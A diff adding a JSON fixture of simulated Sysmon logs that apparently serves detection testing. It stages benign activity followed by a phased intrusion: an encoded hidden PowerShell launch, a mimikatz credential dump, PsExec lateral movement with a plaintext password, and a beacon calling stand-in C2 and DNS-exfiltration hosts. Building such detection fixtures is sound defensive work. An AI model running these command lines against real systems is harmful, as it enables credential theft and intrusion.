@@ -1,0 +1,341 @@
+[
+  {"_comment": "=== BACKGROUND NOISE: Legitimate Activity (12:00-13:50) ==="},
+
+  {
+    "EventID": 1,
+    "UtcTime": "2024-06-15 12:00:00.000",
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "ProcessId": 1000,
+    "CommandLine": "svchost.exe -k netsvcs -p -s wuauserv",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "ParentProcessId": 600,
+    "Computer": "WORKSTATION-01"
+  },
+  {
+    "EventID": 22,
+    "UtcTime": "2024-06-15 12:01:00.000",
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "QueryName": "download.windowsupdate.com",
+    "QueryResults": "13.107.4.50",
+    "QueryType": "A",
+    "Computer": "WORKSTATION-01"
+  },
+  {
+    "EventID": 3,
+    "UtcTime": "2024-06-15 12:02:00.000",
+    "Computer": "WORKSTATION-01",
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "SourceIp": "192.168.1.10",
+    "SourcePort": "49100",
+    "DestinationIp": "13.107.4.50",
+    "DestinationPort": "443",
+    "Protocol": "tcp"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2024-06-15 13:30:00.000",
+    "Image": "C:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE",
+    "User": "CORP\\jsmith",
+    "ProcessId": 3200,
+    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE\"",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "ParentProcessId": 2100,
+    "Computer": "WORKSTATION-01"
+  },
+  {
+    "EventID": 22,
+    "UtcTime": "2024-06-15 13:31:00.000",
+    "Image": "C:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE",
+    "QueryName": "outlook.office365.com",
+    "QueryResults": "52.96.0.1",
+    "QueryType": "A",
+    "Computer": "WORKSTATION-01"
+  },
+  {
+    "EventID": 3,
+    "UtcTime": "2024-06-15 13:32:00.000",
+    "Computer": "WORKSTATION-01",
+    "Image": "C:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE",
+    "SourceIp": "192.168.1.10",
+    "SourcePort": "49110",
+    "DestinationIp": "52.96.0.1",
+    "DestinationPort": "443",
+    "Protocol": "tcp"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2024-06-15 13:45:00.000",
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "User": "CORP\\jsmith",
+    "ProcessId": 3500,
+    "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "ParentProcessId": 2100,
+    "Computer": "WORKSTATION-01"
+  },
+  {
+    "EventID": 22,
+    "UtcTime": "2024-06-15 13:46:00.000",
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "QueryName": "www.google.com",
+    "QueryResults": "142.250.80.4",
+    "QueryType": "A",
+    "Computer": "WORKSTATION-01"
+  },
+  {
+    "EventID": 3,
+    "UtcTime": "2024-06-15 13:47:00.000",
+    "Computer": "WORKSTATION-01",
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "SourceIp": "192.168.1.10",
+    "SourcePort": "49120",
+    "DestinationIp": "142.250.80.4",
+    "DestinationPort": "443",
+    "Protocol": "tcp"
+  },
+
+  {"_comment": "=== PHASE 1: Initial Compromise - Spearphishing (14:00) ==="},
+
+  {
+    "EventID": 1,
+    "UtcTime": "2024-06-15 14:00:00.000",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "User": "CORP\\jsmith",
+    "ProcessId": 4820,
+    "CommandLine": "powershell.exe -ep bypass -nop -w hidden -enc SQBFAFgA...",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE",
+    "ParentProcessId": 3200,
+    "Computer": "WORKSTATION-01"
+  },
+
+  {"_comment": "=== PHASE 2: Discovery & Reconnaissance (14:02-14:06) ==="},
+
+  {
+    "EventID": 1,
+    "UtcTime": "2024-06-15 14:02:00.000",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\jsmith",
+    "ProcessId": 5100,
+    "CommandLine": "cmd.exe /c whoami /all && net user /domain",
+    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "ParentProcessId": 4820,
+    "Computer": "WORKSTATION-01"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2024-06-15 14:03:00.000",
+    "Image": "C:\\Windows\\System32\\net.exe",
+    "User": "CORP\\jsmith",
+    "ProcessId": 5200,
+    "CommandLine": "net.exe view \\\\SERVER-DC01 /all",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "ParentProcessId": 5100,
+    "Computer": "WORKSTATION-01"
+  },
+  {
+    "EventID": 3,
+    "UtcTime": "2024-06-15 14:05:00.000",
+    "Computer": "WORKSTATION-01",
+    "Image": "C:\\Windows\\System32\\net.exe",
+    "SourceIp": "192.168.1.10",
+    "SourcePort": "49152",
+    "DestinationIp": "192.168.1.100",
+    "DestinationPort": "445",
+    "Protocol": "tcp",
+    "DestinationHostname": "SERVER-DC01"
+  },
+  {
+    "EventID": 3,
+    "UtcTime": "2024-06-15 14:06:00.000",
+    "Computer": "WORKSTATION-01",
+    "Image": "C:\\Windows\\System32\\net.exe",
+    "SourceIp": "192.168.1.10",
+    "SourcePort": "49153",
+    "DestinationIp": "192.168.1.200",
+    "DestinationPort": "445",
+    "Protocol": "tcp",
+    "DestinationHostname": "SERVER-FILE01"
+  },
+
+  {"_comment": "=== PHASE 3: Credential Theft (14:08-14:10) ==="},
+
+  {
+    "EventID": 1,
+    "UtcTime": "2024-06-15 14:08:00.000",
+    "Image": "C:\\Users\\jsmith\\Downloads\\mimikatz.exe",
+    "User": "CORP\\jsmith",
+    "ProcessId": 5500,
+    "CommandLine": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
+    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "ParentProcessId": 4820,
+    "Computer": "WORKSTATION-01"
+  },
+  {
+    "EventID": 11,
+    "UtcTime": "2024-06-15 14:09:00.000",
+    "Image": "C:\\Users\\jsmith\\Downloads\\mimikatz.exe",
+    "TargetFilename": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\creds-dump.txt",
+    "Computer": "WORKSTATION-01",
+    "Hashes": "SHA256=e3b0c44298fc1c149afbf4c8996fb924"
+  },
+
+  {"_comment": "=== PHASE 4: Lateral Movement via PsExec (14:12-14:15) ==="},
+
+  {
+    "EventID": 1,
+    "UtcTime": "2024-06-15 14:12:00.000",
+    "Image": "C:\\Users\\jsmith\\Downloads\\PsExec64.exe",
+    "User": "CORP\\admin",
+    "ProcessId": 6000,
+    "CommandLine": "PsExec64.exe \\\\SERVER-DC01 -u CORP\\admin -p P@ssw0rd cmd.exe",
+    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "ParentProcessId": 4820,
+    "Computer": "WORKSTATION-01"
+  },
+  {
+    "EventID": 3,
+    "UtcTime": "2024-06-15 14:13:00.000",
+    "Computer": "WORKSTATION-01",
+    "Image": "C:\\Users\\jsmith\\Downloads\\PsExec64.exe",
+    "SourceIp": "192.168.1.10",
+    "SourcePort": "49160",
+    "DestinationIp": "192.168.1.100",
+    "DestinationPort": "445",
+    "Protocol": "tcp",
+    "DestinationHostname": "SERVER-DC01"
+  },
+
+  {"_comment": "=== PHASE 5: Malware Deployment on DC (14:15-14:19) ==="},
+
+  {
+    "EventID": 1,
+    "UtcTime": "2024-06-15 14:15:00.000",
+    "Image": "C:\\Windows\\Temp\\dropper.exe",
+    "User": "CORP\\admin",
+    "ProcessId": 7100,
+    "CommandLine": "dropper.exe --install --silent --persist",
+    "ParentImage": "C:\\Users\\jsmith\\Downloads\\PsExec64.exe",
+    "ParentProcessId": 6000,
+    "Computer": "SERVER-DC01"
+  },
+  {
+    "EventID": 11,
+    "UtcTime": "2024-06-15 14:16:00.000",
+    "Image": "C:\\Windows\\Temp\\dropper.exe",
+    "TargetFilename": "C:\\Windows\\System32\\svchost-updater.dll",
+    "Computer": "SERVER-DC01",
+    "Hashes": "SHA256=a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4"
+  },
+  {
+    "EventID": 11,
+    "UtcTime": "2024-06-15 14:17:00.000",
+    "Image": "C:\\Windows\\Temp\\dropper.exe",
+    "TargetFilename": "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\backdoor-config.dat",
+    "Computer": "SERVER-DC01",
+    "Hashes": "SHA256=deadbeefdeadbeefdeadbeefdeadbeef"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2024-06-15 14:18:00.000",
+    "Image": "C:\\Windows\\Temp\\beacon.exe",
+    "User": "CORP\\admin",
+    "ProcessId": 7500,
+    "CommandLine": "beacon.exe -c2 evil-c2.darknet.io -interval 30",
+    "ParentImage": "C:\\Windows\\Temp\\dropper.exe",
+    "ParentProcessId": 7100,
+    "Computer": "SERVER-DC01"
+  },
+
+  {"_comment": "=== PHASE 6: Persistence - PowerShell backdoor script (14:19) ==="},
+
+  {
+    "EventID": 11,
+    "UtcTime": "2024-06-15 14:19:00.000",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "TargetFilename": "C:\\Users\\admin\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.bat",
+    "Computer": "WORKSTATION-01"
+  },
+
+  {"_comment": "=== PHASE 7: C2 Beaconing & DNS Exfiltration (14:20-14:30) ==="},
+
+  {
+    "EventID": 22,
+    "UtcTime": "2024-06-15 14:20:00.000",
+    "Image": "C:\\Windows\\Temp\\beacon.exe",
+    "QueryName": "evil-c2.darknet.io",
+    "QueryResults": "203.0.113.42",
+    "QueryType": "A",
+    "Computer": "SERVER-DC01"
+  },
+  {
+    "EventID": 22,
+    "UtcTime": "2024-06-15 14:22:00.000",
+    "Image": "C:\\Windows\\Temp\\beacon.exe",
+    "QueryName": "aGVsbG8gd29ybGQ=.data.exfil-tunnel.net",
+    "QueryResults": "",
+    "QueryType": "TXT",
+    "Computer": "SERVER-DC01"
+  },
+  {
+    "EventID": 22,
+    "UtcTime": "2024-06-15 14:25:00.000",
+    "Image": "C:\\Windows\\Temp\\beacon.exe",
+    "QueryName": "c3RhZ2luZw==.data.exfil-tunnel.net",
+    "QueryResults": "",
+    "QueryType": "TXT",
+    "Computer": "SERVER-DC01"
+  },
+  {
+    "EventID": 22,
+    "UtcTime": "2024-06-15 14:27:00.000",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "QueryName": "update.legit-looking.com",
+    "QueryResults": "198.51.100.77",
+    "QueryType": "A",
+    "Computer": "WORKSTATION-01"
+  },
+  {
+    "EventID": 22,
+    "UtcTime": "2024-06-15 14:28:00.000",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "QueryName": "c2-callback.malware-cdn.ru",
+    "QueryResults": "198.51.100.88",
+    "QueryType": "A",
+    "Computer": "WORKSTATION-01"
+  },
+
+  {"_comment": "=== PHASE 8: Data Exfiltration via Network (14:30-14:35) ==="},
+
+  {
+    "EventID": 11,
+    "UtcTime": "2024-06-15 14:30:00.000",
+    "Image": "C:\\Windows\\Temp\\beacon.exe",
+    "TargetFilename": "C:\\Windows\\Temp\\exfil-staging.zip",
+    "Computer": "SERVER-DC01",
+    "Hashes": "SHA256=cafebabecafebabecafebabecafebabe"
+  },
+  {
+    "EventID": 3,
+    "UtcTime": "2024-06-15 14:32:00.000",
+    "Computer": "SERVER-DC01",
+    "Image": "C:\\Windows\\Temp\\beacon.exe",
+    "SourceIp": "192.168.1.100",
+    "SourcePort": "49200",
+    "DestinationIp": "203.0.113.42",
+    "DestinationPort": "443",
+    "Protocol": "tcp",
+    "DestinationHostname": "evil-c2.darknet.io"
+  },
+  {
+    "EventID": 3,
+    "UtcTime": "2024-06-15 14:35:00.000",
+    "Computer": "WORKSTATION-01",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "SourceIp": "192.168.1.10",
+    "SourcePort": "49300",
+    "DestinationIp": "198.51.100.77",
+    "DestinationPort": "8443",
+    "Protocol": "tcp"
+  }
+]
